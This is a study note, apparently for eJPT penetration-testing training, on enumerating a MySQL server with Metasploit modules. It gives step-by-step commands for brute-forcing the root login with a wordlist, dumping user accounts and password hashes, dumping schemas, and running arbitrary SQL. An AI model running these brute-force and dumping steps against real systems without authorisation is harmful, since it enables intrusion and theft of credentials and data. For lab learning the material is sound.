---
title: MySQL Enumeration
tags: [eJPT, Enumeration, MySQL, MSF, BruteForce, Database]
created: 2026-06-02
source: Transcripts
---

# MySQL Enumeration

**Related:** [[FTP-Enumeration]] | [[SMB-Enumeration]] | [[Web-Server-Enumeration]] | [[00-INDEX]]

---

## Overview

MySQL is an open-source relational database management system (RDBMS) based on SQL. It is commonly deployed to store web application data (e.g., WordPress). MySQL runs on **TCP port 3306** by default but may be moved to another port.

**Enumeration goals:**
- Identify MySQL version running
- Brute-force credentials (targeting `root` user)
- Enumerate databases, tables, and schema
- Execute SQL queries to extract data

---

## Step 1 — Setup

```bash
# Start PostgreSQL and MSF
service postgresql start
msfconsole

# Create workspace
workspace add mysql_enum

# Set global target IP
setg RHOSTS <target_ip>
setg RHOST <target_ip>
```

---

## Step 2 — Version Detection

```bash
# Search for MySQL modules
search type:auxiliary name:mysql

# Use version detection module
use auxiliary/scanner/mysql/mysql_version
show options
run
# → Returns MySQL version + OS banner (e.g., MySQL 5.5.61 on Ubuntu 14.04)
```

---

## Step 3 — Brute Force Login

```bash
use auxiliary/scanner/mysql/mysql_login
show options

# Target root user (highest privilege)
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
run
# → Found credentials: root:twinkle
```

---

## Step 4 — Enumerate with Credentials

```bash
# Full enumeration (requires credentials)
use auxiliary/admin/mysql/mysql_enum
set PASSWORD <password>
set USERNAME root
run
# Returns: version, hostname, architecture, user accounts + hashes, privileges
```

---

## Step 5 — Execute SQL Queries

```bash
use auxiliary/admin/mysql/mysql_sql
set PASSWORD <password>
set USERNAME root

# Show MySQL version
set SQL select version();
run

# List all databases
set SQL show databases;
run

# Select a database
set SQL use <db_name>;
run
```

---

## Step 6 — Dump Schema

```bash
use auxiliary/scanner/mysql/mysql_schemadump
set PASSWORD <password>
set USERNAME root
run
# → Dumps all databases and their tables
```

---

## Step 7 — Command-Line Access

```bash
# Direct MySQL CLI access from Kali
mysql -h <target_ip> -u root -p
# Enter password when prompted

# Inside MySQL:
show databases;
use <database>;
show tables;
select * from <table>;
```

---

## MSF Database Commands

```bash
# After running modules, review stored info:
hosts           # All discovered hosts
services        # All discovered services
loot            # Dumped schema/data
creds           # Discovered credentials
```

---

## Key Takeaways

- MySQL default port is **3306** — always run a full port scan to catch it on alternate ports
- Target **root** user for brute force — highest privilege on the database
- `mysql_enum` requires credentials but dumps accounts + password hashes
- `mysql_sql` is the most powerful module — lets you run arbitrary SQL queries
- Always use workspaces so loot and creds are organized per assessment
